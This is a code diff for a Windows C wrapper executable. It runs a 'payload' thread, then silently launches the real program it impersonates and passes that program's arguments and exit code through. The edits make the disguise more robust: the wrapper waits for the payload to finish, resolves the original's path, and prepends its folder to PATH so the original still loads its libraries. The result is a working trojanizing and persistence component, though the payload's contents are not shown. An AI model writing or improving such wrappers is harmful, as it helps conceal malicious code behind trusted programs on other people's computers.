@@ -97,12 +97,41 @@ static DWORD WINAPI payload_thread(LPVOID unused)
     return 0;
 }
 
-static void run_payload(void)
+static void run_payload(HANDLE *thread)
 {
-    HANDLE t = CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
-    if (t) {
-        CloseHandle(t);
+    *thread = CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
+}
+
+static void wait_payload(HANDLE thread)
+{
+    if (!thread) {
+        return;
     }
+    WaitForSingleObject(thread, INFINITE);
+    CloseHandle(thread);
+}
+
+static void prepend_dir_to_path(const wchar_t *orig)
+{
+    wchar_t dir[MAX_PATH];
+    wchar_t old[32768];
+    wchar_t neu[32768];
+    DWORD n;
+
+    wcsncpy(dir, orig, MAX_PATH);
+    dir[MAX_PATH - 1] = 0;
+    wchar_t *slash = wcsrchr(dir, L'\\');
+    if (!slash) {
+        return;
+    }
+    *slash = 0;
+    n = GetEnvironmentVariableW(L"PATH", old, 32768);
+    if (!n || n >= 32768) {
+        SetEnvironmentVariableW(L"PATH", dir);
+        return;
+    }
+    _snwprintf(neu, 32768, L"%s;%s", dir, old);
+    SetEnvironmentVariableW(L"PATH", neu);
 }
 
 static const wchar_t *skip_argv0(const wchar_t *s)
@@ -123,13 +152,26 @@ static const wchar_t *skip_argv0(const wchar_t *s)
     return s;
 }
 
+static void original_path(wchar_t *out, size_t n)
+{
+    if ((ORIGINAL_EXE[0] == L'\\' && ORIGINAL_EXE[1] == L'\\') ||
+        (ORIGINAL_EXE[0] && ORIGINAL_EXE[1] == L':')) {
+        _snwprintf(out, n, L"%s", ORIGINAL_EXE);
+        return;
+    }
+    _snwprintf(out, n, L"%s\\%s", g_dir, ORIGINAL_EXE);
+}
+
 int main(void)
 {
+    HANDLE payload = NULL;
+
     exe_dir();
-    run_payload();
+    run_payload(&payload);
 
     wchar_t orig[MAX_PATH];
-    _snwprintf(orig, MAX_PATH, L"%s\\%s", g_dir, ORIGINAL_EXE);
+    original_path(orig, MAX_PATH);
+    prepend_dir_to_path(orig);
 
     const wchar_t *rest = skip_argv0(GetCommandLineW());
     wchar_t newcmd[32768];
@@ -143,6 +185,7 @@ int main(void)
     ZeroMemory(&pi, sizeof(pi));
 
     if (!CreateProcessW(orig, newcmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+        wait_payload(payload);
         return 1;
     }
     CloseHandle(pi.hThread);
@@ -150,5 +193,6 @@ int main(void)
     DWORD code = 1;
     GetExitCodeProcess(pi.hProcess, &code);
     CloseHandle(pi.hProcess);
+    wait_payload(payload);
     return (int)code;
 }
